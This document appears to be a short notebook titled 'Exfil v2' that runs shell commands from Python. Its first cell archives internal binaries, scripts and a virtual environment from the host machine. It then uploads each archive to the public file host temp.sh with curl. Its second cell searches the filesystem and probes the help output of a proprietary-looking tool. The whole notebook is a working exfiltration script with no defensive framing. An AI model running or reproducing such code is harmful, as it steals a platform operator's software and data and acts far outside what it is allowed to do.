# Exfil v2 (single-render)
Build tars + upload in one pod lifetime.

In [ ]:
import subprocess, os
def run(cmd, t=400):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

os.makedirs("/tmp/exfil", exist_ok=True)
print(run("tar czf /tmp/exfil/connect-engine.tar.gz -C /opt/connect/current/bin connect-engine 2>&1"))
print(run("tar czf /tmp/exfil/vivid-blender-scripts.tar.gz /tmp/vivid-blender 2>&1"))
print(run("tar czf /tmp/exfil/vivid-blender-live.tar.gz /posit/vivid-blender-live 2>&1"))
print(run("du -sh /cloud/lib/venv 2>&1"))
print(run("tar czf /tmp/exfil/venv.tar.gz /cloud/lib/venv 2>&1"))
for f in sorted(os.listdir("/tmp/exfil")):
    path = "/tmp/exfil/" + f
    sz = os.path.getsize(path)
    print("UPLOAD", f, sz, "bytes")
    print(run("curl -s --max-time 280 --upload-file %s https://temp.sh/ | head -c 400" % path, 300))
    print()

In [ ]:
import subprocess
def run(cmd, t=40):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

print(run("find / -name '*vivid*' -o -name '*blender*' 2>/dev/null | grep -v venv | grep -v '/proc/' | head -30", 40))
print(run("ls -la /opt/connect/current/bin/ 2>&1 | head -30", 10))
print(run("/posit/vivid-blender-live --help 2>&1 | head -50", 15))
print(run("/posit/vivid-blender-live fileops --help 2>&1 | head -50", 15))